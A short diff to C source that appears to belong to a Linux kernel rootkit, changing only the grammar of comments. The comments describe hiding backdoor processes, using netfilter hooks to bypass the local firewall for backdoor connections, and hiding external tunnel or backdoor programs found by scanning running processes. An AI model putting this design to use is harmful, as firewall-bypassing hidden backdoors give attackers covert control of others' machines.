@@ -138,9 +138,9 @@ static int _unhide_task(void *data) {
      * connection. In sock.c I keep references for them in a list,that is needed
      * because of active nf hooks that bypass the local firewall, so for each packet
      * coming to a destination I can distinguish if that packet belongs to a backdoor.
-     * If there is a nettfilter rules blocking that connection, it will be bypassed and
+     * If there are nettfilter rules blocking that connection, they will be bypassed and
      * the connection will flow normally, but if the backdoor task is being unhidden then
-     * I need to cleanup that reference because the task will be killed soon afterwards.
+     * I need to cleanup that reference because the task will be killed right after.
      */
     if (ht->saddr) {
         kv_bd_cleanup_item(&ht->saddr);
@@ -447,7 +447,7 @@ bool kv_for_each_hidden_backdoor_data(bool (*cb)(__be32, void *), void *priv) {
 /**
  * This function runs once at init time
  * Ideally this will hide a network application such
- * as a tunnel or a external backdoor-like application
+ * as a tunnel or an external backdoor-like application,
  * other than the built-in ones
  *
  * It scans all processes running on the system
